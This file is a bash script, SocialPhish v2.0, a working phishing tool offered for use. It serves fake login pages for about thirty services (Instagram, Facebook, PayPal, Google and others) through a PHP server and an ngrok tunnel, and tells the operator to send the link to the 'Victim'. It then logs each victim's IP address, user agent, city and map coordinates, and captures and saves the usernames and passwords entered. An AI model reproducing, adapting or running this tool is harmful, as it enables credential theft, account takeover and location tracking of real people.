#!/bin/bash
# SocialPhish v2.0
# Coded by: Hak9
# Github: https://github.com/xHak9x/SocialPhish
# This script uses some Phishing Pages generated by SocialFish tool (UndeadSec) (https://github.com/UndeadSec/SocialFish)
# Enhanced and Upgraded by: @thesushilsharma (https://github.com/thesushilsharma/SocialPhish)

trap 'printf "\n";stop;exit 1' 2

banner() {
   clear
   printf "\e[1;77m ███████╗ ██████╗  ██████╗██╗ █████╗ ██╗     ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗ \e[0m\n"
   printf "\e[1;77m ██╔════╝██╔═══██╗██╔════╝██║██╔══██╗██║     ██╔══██╗██║  ██║██║██╔════╝██║  ██║ \e[0m\n"
   printf "\e[1;77m ███████╗██║   ██║██║     ██║███████║██║     ██████╔╝███████║██║███████╗███████║ \e[0m\n"
   printf "\e[1;77m ╚════██║██║   ██║██║     ██║██╔══██║██║     ██╔═══╝ ██╔══██║██║╚════██║██╔══██║ \e[0m\n"
   printf "\e[1;77m ███████║╚██████╔╝╚██████╗██║██║  ██║███████╗██║     ██║  ██║██║███████║██║  ██║ \e[0m\n"
   printf "\e[1;77m ╚══════╝ ╚═════╝  ╚═════╝╚═╝╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝ \e[0m\n"
   printf "\n"
   printf "\e[1;93m       .:.:.\e[0m\e[1;77m Phishing Tool coded by: @Hak9 \e[0m\e[1;93m.:.:.\e[0m\n"
   printf "\e[1;93m       SocialPhish Ver 2.0 \e[0m \n"
   printf "\e[1;77m       Enhanced and Upgraded by @thesushilsharma \e[0m \n"
   printf "\n"
}

dependencies() {

   if [ "$(dpkg -s curl 2>/dev/null | grep -c "ok installed")" -eq 0 ]; then
      printf "\e[0m\e[1;91m [\e[1;97m~\e[1;91m]\e[1;93m Curl not found! Installing ....\e[0m\n\n"
      sudo apt-get install curl -y
   else
      printf "\e[0m\e[1;91m [\e[1;97m~\e[1;91m]\e[1;93m Curl is already installed !! \e[0m\n\n"
   fi

   if [ "$(dpkg -s php 2>/dev/null | grep -c "ok installed")" -eq 0 ]; then
      printf "\e[0m\e[1;91m [\e[1;97m~\e[1;91m]\e[1;93m PHP not found! Installing ....\e[0m\n\n"
      sudo apt-get install php -y
   else
      printf "\e[0m\e[1;91m [\e[1;97m~\e[1;91m]\e[1;93m PHP is already installed !! \e[0m\n\n"
   fi

   if [ "$(dpkg -s wget 2>/dev/null | grep -c "ok installed")" -eq 0 ]; then
      echo -e "Wget not found! Installing.. "
      printf "\e[0m\e[1;91m [\e[1;97m~\e[1;91m]\e[1;93m Wget not found! Installing ....\e[0m\n\n"
      sudo apt-get install wget -y
   else
      printf "\e[0m\e[1;91m [\e[1;97m~\e[1;91m]\e[1;93m Wget is already installed !! \e[0m\n\n"
   fi

   if [ "$(dpkg -s unzip 2>/dev/null | grep -c "ok installed")" -eq 0 ]; then

      printf "\e[0m\e[1;91m [\e[1;97m~\e[1;91m]\e[1;93m Unzip not found! Installing !! \e[0m\n\n"
      sudo apt-get install unzip -y
   else
      printf "\e[0m\e[1;91m [\e[1;97m~\e[1;91m]\e[1;93m Unzip already installed !! \e[0m\n\n"
   fi

   if [ "$(dpkg -s jq 2>/dev/null | grep -c "ok installed")" -eq 0 ]; then
      printf "\e[0m\e[1;91m [\e[1;97m~\e[1;91m]\e[1;93m JQ not found! Installing ....\e[0m\n\n"
      sudo apt-get install jq -y
   else
      printf "\e[0m\e[1;91m [\e[1;97m~\e[1;91m]\e[1;93m JQ already installed !! \e[0m\n\n"
   fi

   printf "\e[0m\n"
   printf "\e[0m\e[1;91m [\e[1;97m~\e[1;91m]\e[1;93m Installation Completed !! \e[0m\n"
   printf "\e[0m\n"
   sleep 2
   printf "\e[0m\e[1;91m [\e[1;97m~\e[1;91m] \e[1;96mSocialFish \e[1;93mwill start automtically !! \e[0m\n"
   printf "\e[0m\n"
   printf "\e[0m\n"
}

menu() {
   printf "\e[1;92m[\e[0m\e[1;77m00\e[0m\e[1;92m]\e[0m\e[1;91m Exit\e[0m               \n\n"
   printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;96m Instagram\e[0m      \e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;96m IGFollowers\e[0m   \e[1;92m[\e[0m\e[1;77m33\e[0m\e[1;92m]\e[0m\e[1;96m Custom    \e[0m\e[1;94m \n"
   printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;96m Facebook\e[0m       \e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;96m eBay   \e[0m\n"
   printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;96m Snapchat\e[0m       \e[1;92m[\e[0m\e[1;77m19\e[0m\e[1;92m]\e[0m\e[1;96m Pinterest   \e[0m\n"
   printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;96m Twitter\e[0m        \e[1;92m[\e[0m\e[1;77m20\e[0m\e[1;92m]\e[0m\e[1;96m CryptoCurrency   \e[0m\n"
   printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;96m Github\e[0m         \e[1;92m[\e[0m\e[1;77m21\e[0m\e[1;92m]\e[0m\e[1;96m Verizon   \e[0m\n"
   printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;96m Google\e[0m         \e[1;92m[\e[0m\e[1;77m22\e[0m\e[1;92m]\e[0m\e[1;96m DropBox   \e[0m \n"
   printf "\e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;96m Spotify\e[0m        \e[1;92m[\e[0m\e[1;77m23\e[0m\e[1;92m]\e[0m\e[1;96m Adobe ID   \e[0m \n"
   printf "\e[1;92m[\e[0m\e[1;77m08\e[0m\e[1;92m]\e[0m\e[1;96m Netflix\e[0m        \e[1;92m[\e[0m\e[1;77m24\e[0m\e[1;92m]\e[0m\e[1;96m Shopify   \e[0m  \n"
   printf "\e[1;92m[\e[0m\e[1;77m09\e[0m\e[1;92m]\e[0m\e[1;96m PayPal\e[0m         \e[1;92m[\e[0m\e[1;77m25\e[0m\e[1;92m]\e[0m\e[1;96m Messenger   \e[0m \n"
   printf "\e[1;92m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;96m Origin\e[0m         \e[1;92m[\e[0m\e[1;77m26\e[0m\e[1;92m]\e[0m\e[1;96m GitLab   \e[0m    \n"
   printf "\e[1;92m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;96m Steam\e[0m          \e[1;92m[\e[0m\e[1;77m27\e[0m\e[1;92m]\e[0m\e[1;96m Twitch   \e[0m     \n"
   printf "\e[1;92m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;96m Yahoo\e[0m          \e[1;92m[\e[0m\e[1;77m28\e[0m\e[1;92m]\e[0m\e[1;96m MySpace   \e[0m    \n"
   printf "\e[1;92m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;96m Linkedin\e[0m       \e[1;92m[\e[0m\e[1;77m29\e[0m\e[1;92m]\e[0m\e[1;96m Badoo   \e[0m      \n"
   printf "\e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;96m Protonmail\e[0m     \e[1;92m[\e[0m\e[1;77m30\e[0m\e[1;92m]\e[0m\e[1;96m VK   \e[0m         \n"
   printf "\e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;96m Wordpress\e[0m      \e[1;92m[\e[0m\e[1;77m31\e[0m\e[1;92m]\e[0m\e[1;96m Yandex   \e[0m     \n"
   printf "\e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;96m Microsoft\e[0m      \e[1;92m[\e[0m\e[1;77m32\e[0m\e[1;92m]\e[0m\e[1;96m devianART   \e[0m \n"

   read -r -p $'\n\e[1;92m\e[0m\e[1;77m\e[0m\e[1;92m ┌─[ Choose an option:]─[~]
 └──╼ ~ ' option

   case $option in
   0)
      echo "OK, see you!"
      exit 0
      ;;
   1)
      server="instagram"
      start
      ;;
   2)
      server="facebook"
      start
      ;;
   3)
      server="snapchat"
      start
      ;;
   4)
      server="twitter"
      start
      ;;
   5)
      server="github"
      start
      ;;
   6)
      server="google"
      start
      ;;
   7)
      server="spotify"
      start
      ;;
   8)
      server="netflix"
      start
      ;;
   9)
      server="paypal"
      start
      ;;
   10)
      server="origin"
      start
      ;;
   11)
      server="steam"
      start
      ;;
   12)
      server="yahoo"
      start
      ;;
   13)
      server="linkedin"
      start
      ;;
   14)
      server="protonmail"
      start
      ;;
   15)
      server="wordpress"
      start
      ;;
   16)
      server="microsoft"
      start
      ;;
   17)
      server="instafollowers"
      start
      ;;
   18)
      server="shopping"
      start
      ;;
   19)
      server="pinterest"
      start
      ;;
   20)
      server="cryptocurrency"
      start
      ;;
   21)
      server="verizon"
      start
      ;;
   22)
      server="dropbox"
      start
      ;;
   23)
      server="adobe"
      start
      ;;
   24)
      server="shopify"
      start
      ;;
   25)
      server="messenger"
      start
      ;;
   26)
      server="gitlab"
      start
      ;;
   27)
      server="twitch"
      start
      ;;
   28)
      server="myspace"
      start
      ;;
   29)
      server="badoo"
      start
      ;;
   30)
      server="vk"
      start
      ;;
   31)
      server="yandex"
      start
      ;;
   32)
      server="devianart"
      start
      ;;
   33)
      server="create"
      sleep 2
      clear
      menu
      ;;
   *)
      printf "\e[1;93m [!] Your entry does not match any of the conditions! Try an option from 0 to 33.\e[0m\n"
      sleep 2
      clear
      menu
      ;;
   esac
}

stop() {

   checkngrok=$(pgrep -f "ngrok" | head -n1)
   checkphp=$(pgrep -f "php" | head -n1)
   if [[ $checkngrok == *'ngrok'* ]]; then
      pkill -f -2 ngrok >/dev/null 2>&1
      killall -2 ngrok >/dev/null 2>&1
   fi
   if [[ $checkphp == *'php'* ]]; then
      pkill -f -2 php >/dev/null 2>&1
      killall -2 php >/dev/null 2>&1
   fi

}

createpage() {
   default_cap1="Wi-fi Session Expired"
   default_cap2="Please login again."
   default_user_text="Username:"
   default_pass_text="Password:"
   default_sub_text="Log-In"

   read -r -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 (Default: Wi-fi Session Expired): \e[0m' cap1
   cap1="${cap1:-${default_cap1}}"

   read -r -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 2 (Default: Please login again.): \e[0m' cap2
   cap2="${cap2:-${default_cap2}}"

   read -r -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Username field (Default: Username:): \e[0m' user_text
   user_text="${user_text:-${default_user_text}}"

   read -r -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Password field (Default: Password:): \e[0m' pass_text
   pass_text="${pass_text:-${default_pass_text}}"

   read -r -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default: Log-In): \e[0m' sub_text
   sub_text="${sub_text:-${default_sub_text}}"

   echo "<!DOCTYPE html>" >sites/create/login.html
   echo "<html>" >>sites/create/login.html
   echo "<body bgcolor=\"gray\" text=\"white\">" >>sites/create/login.html
   IFS=$'\n'
   printf '<center><h2> %s <br><br> %s </h2></center><center>\n' "$cap1" "$cap2" >>sites/create/login.html
   IFS=$'\n'
   printf '<form method="POST" action="login.php"><label>%s </label>\n' "$user_text" >>sites/create/login.html
   IFS=$'\n'
   printf '<input type="text" name="username" length=64>\n' >>sites/create/login.html
   IFS=$'\n'
   printf '<br><label>%s: </label>' "$pass_text" >>sites/create/login.html
   IFS=$'\n'
   printf '<input type="password" name="password" length=64><br><br>\n' >>sites/create/login.html
   IFS=$'\n'
   printf '<input value="%s" type="submit"></form>\n' "$sub_text" >>sites/create/login.html
   printf '</center>' >>sites/create/login.html
   printf '<body>\n' >>sites/create/login.html
   printf '</html>\n' >>sites/create/login.html

}

catch_cred() {

   account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
   IFS=$'\n'
   password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
   printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" "$account"
   printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" "$password"
   cat sites/$server/usernames.txt >>sites/$server/saved.usernames.txt
   printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
   killall -2 php >/dev/null 2>&1
   killall -2 ngrok >/dev/null 2>&1
   exit 1

}

getcredentials() {
   echo ' '
   printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting credentials ...\e[0m\n"
   while true; do

      if [[ -e "sites/$server/usernames.txt" ]]; then
         printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
         catch_cred

      fi
      sleep 1
   done

}

catch_ip() {
   touch sites/$server/saved.usernames.txt
   ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
   IFS=$'\n'
   ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
   cn=$(curl -s https://ipapi.co/"$ip"/json | jq -r '.country_name')
   ct=$(curl -s https://ipapi.co/"$ip"/json | jq -r '.city')
   org=$(curl -s https://ipinfo.io/"$ip"/json | jq -r '.org')
   tz=$(curl -s https://ipinfo.io/"$ip"/json | jq -r '.timezone')
   lat=$(curl -s https://ipapi.co/"$ip"/json/ | jq -r '.latitude')
   lon=$(curl -s https://ipapi.co/"$ip"/json/ | jq -r '.longitude')

   gm="https://www.google.com/maps/search/?api=1&query="$lat,$lon

   printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] IPv4:\e[0m\e[1;77m %s\e[0m\n" "$ip"
   printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" "$ua"
   printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Country:\e[0m\e[1;77m %s\e[0m\n" "$cn"
   printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] City:\e[0m\e[1;77m %s\e[0m\n" "$ct"
   printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Maps:\e[0m\e[1;77m %s\e[0m\n" "$gm"
   printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] ISP:\e[0m\e[1;77m %s\e[0m\n" "$org"
   printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Timezone:\e[0m\e[1;77m %s\e[0m\n" "$tz"
   printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
   cat sites/$server/ip.txt >>sites/$server/saved.ip.txt

   getcredentials
}

##

start() {

   printf "\e[0m\e[1;91m [\e[1;97m~\e[1;91m]\e[1;93m Setting Up Environment ....\e[0m\n\n"
   printf "\e[0m\n"

   if [[ -e sites/$server/ip.txt ]]; then
      rm -rf sites/$server/ip.txt
   fi

   if [[ -e sites/$server/usernames.txt ]]; then
      rm -rf sites/$server/usernames.txt
   fi

   if [[ -e ngrok ]]; then
      echo ""
   else

      printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
      arch=$(uname -a | grep -o 'arm' | head -n1)
      arch2=$(uname -a | grep -o 'Android' | head -n1)
      if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]]; then
         wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.zip >/dev/null 2>&1

         if [[ -e ngrok-v3-stable-linux-arm.zip ]]; then
            unzip ngrok-v3-stable-linux-arm.zip >/dev/null 2>&1
            chmod +x ngrok
            rm -rf ngrok-v3-stable-linux-arm.zip
         else
            printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
            exit 1
         fi

      else

         wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.zip >/dev/null 2>&1
         if [[ -e ngrok-v3-stable-linux-386.zip ]]; then
            unzip ngrok-v3-stable-linux-386.zip >/dev/null 2>&1
            chmod +x ngrok
            rm -rf ngrok-v3-stable-linux-386.zip
         else
            printf "\e[1;93m[!] Download error... \e[0m\n"
            exit 1
         fi
      fi
   fi

   if [[ -e ~/.config/ngrok/ngrok.yml ]]; then
      printf "\e[1;93m[\e[0m*\e[1;93m] your ngrok "
      cat ~/.config/ngrok/ngrok.yml
      read -r -p $'\n\e[1;92m[\e[0m+\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token
      if [[ $chg_token == "Y" ]]; then
         read -r -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
         ./ngrok config add-authtoken "$ngrok_auth" >/dev/null 2>&1 &
         printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed\n"
      fi
   else
      read -r -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
      ./ngrok config add-authtoken "$ngrok_auth" >/dev/null 2>&1 &
   fi

   printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
   cd sites/$server && php -S 127.0.0.1:5555 >/dev/null 2>&1 &
   sleep 2
   printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
   ./ngrok http 127.0.0.1:5555 >/dev/null 2>&1 &
   sleep 10

   link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok.io')
   printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" "$link"

   printf "\n"

   checkfound
}

checkfound() {

   printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting victim open the link ...\e[0m\n"
   while true; do

      if [[ -e "sites/$server/ip.txt" ]]; then
         printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
         catch_ip

      fi
      sleep 1
   done

}
banner
dependencies
menu
